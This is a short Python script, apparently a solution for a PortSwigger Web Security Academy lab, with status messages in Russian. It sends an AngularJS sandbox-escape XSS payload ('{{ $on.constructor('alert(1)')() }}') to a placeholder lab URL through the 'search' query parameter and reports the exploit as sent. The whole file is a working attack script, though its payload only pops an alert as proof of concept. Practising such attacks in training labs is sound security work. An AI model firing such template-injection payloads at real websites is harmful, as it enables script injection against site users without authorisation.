import requests


def injection(url, payload):
  
    URL = f"{url}?search={payload}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(URL, headers=headers)
        
        if response.status_code == 200:
            print("[+] Эксплойт отправлен успешно!")
            print(f"URL с полезной нагрузкой: {URL}")
        else:
            print(f"[-] Ошибка: сервер вернул статус-код {response.status_code}")
    
    except requests.RequestException as e:
        print(f"[-] Ошибка при выполнении запроса: {e}")

if __name__ == "__main__":
    target_url = "https://LAB-ID.web-security-academy.net/" #put the lab-id here
    xss_payload = "{{ $on.constructor('alert(1)')() }}"
    injection(target_url, xss_payload)
